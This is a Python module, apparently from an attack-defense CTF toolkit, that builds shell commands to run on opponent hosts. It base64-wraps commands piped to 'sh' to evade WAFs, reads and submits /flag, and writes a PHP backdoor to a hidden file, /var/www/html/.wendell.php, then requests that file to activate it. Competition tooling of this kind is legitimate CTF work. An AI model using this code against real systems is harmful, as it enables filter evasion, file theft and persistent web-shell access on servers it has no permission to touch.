import re
import base64
from games.submit_flag import submit_flag as real_submit_flag
import hashlib
from utils.tools import *

def set_cmd_with_base64(func):
    """
        to-do 利用装饰器对命令进行修饰,绕过一些waf
    """
    def wrapper(*args, **kwargs):
        cmd = func(*args, **kwargs)
        if cmd is str:
            cmd_str = base64.b64encode(cmd.encode()).decode()
            # return  '{echo,' + cmd + '}|{base64,-d}|{bash,-i}'
            return 'echo ' + cmd + '|base64 -d|sh'
        else:
            cmd_str = base64.b64encode(cmd[0].encode()).decode()
            # cmd_str = '{echo,' + cmd_str + '}|{base64,-d}|{bash,-i}'
            cmd_str = 'echo ' + cmd_str + '|base64 -d|sh'
            return cmd_str, cmd[1]
    return wrapper

@set_cmd_with_base64
def get_flag(target_ip, target_port):
    def find_flag(html):
        try:
            flag = re.compile(r'--a--(.*)?--b--', re.DOTALL).findall(html)[0][1:]
            flag = base64.b64decode(flag.encode()).decode()
        except Exception as e:
            flag = 'flag获取失败'
        return 'flag:' + flag
    return 'echo --a--;cat /flag|base64 -w0;echo --b--;',find_flag

@set_cmd_with_base64
def submit_flag(target_ip, target_port):
    def find_flag(html):
        try:
            flag = re.compile(r'--a--(.*)?--b--', re.DOTALL).findall(html)[0][1:]
            flag = base64.b64decode(flag.encode()).decode()
            res = real_submit_flag(target_ip, target_port, flag)
        except IndexError as e:
            flag = 'flag获取失败'
        except Exception as e:
            pass
        finally:
            res = res if res else target_ip + target_port + ' flag 提交失败'
        # res = real_submit_flag(target_ip, target_port, flag)
        # return '提交 flag: ' + flag + ('   成功' if res else '   失败')
        return '提交 flag: ' + flag + "  结果: " + res
    return 'echo --a--;cat /flag|base64 -w0;echo --b--;', find_flag

@set_cmd_with_base64
def upload_backdoor(target_ip, target_port):
    def get_bsm_with_base64():
        with open('backdoor/bsm/bsm.php','r') as f:
            content = f.read()
        content = content.replace('{{PASSWORD}}', get_backdoor_hash(target_ip, target_port))
        return str_to_base64(content)
    def active_bsm(text):
        import requests
        try:
            requests.get(f'http://{target_ip}:{target_port}/'+ '.wendell.php', timeout=2)
        except requests.exceptions.Timeout as e:
            pass
    return 'echo ' + get_bsm_with_base64() + '|base64 -d > /var/www/html/.wendell.php',active_bsm